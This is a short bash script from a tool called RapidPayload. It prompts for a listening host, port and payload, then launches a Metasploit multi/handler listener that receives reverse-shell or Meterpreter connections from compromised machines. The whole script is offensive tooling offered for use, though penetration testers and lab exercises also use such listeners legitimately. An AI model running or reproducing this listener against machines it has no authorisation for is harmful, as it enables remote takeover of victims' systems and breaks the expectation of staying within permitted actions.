#https://github.com/AngelSecurityTeam
echo -e "\n\033[36m\033[1mRapidPayload:~/LHOST# \033[0m"
read lhost
echo -e "\033[36m\033[1mRapidPayload:~/LPORT# \033[0m"
read lport
echo -e "\033[36m\033[1mRapidPayload:~/PAYLOAD# \033[0m"
read payload1
msfconsole -q -x "use exploit/multi/handler;set payload $payload1; set LHOST $lhost; set LPORT $lport; run"
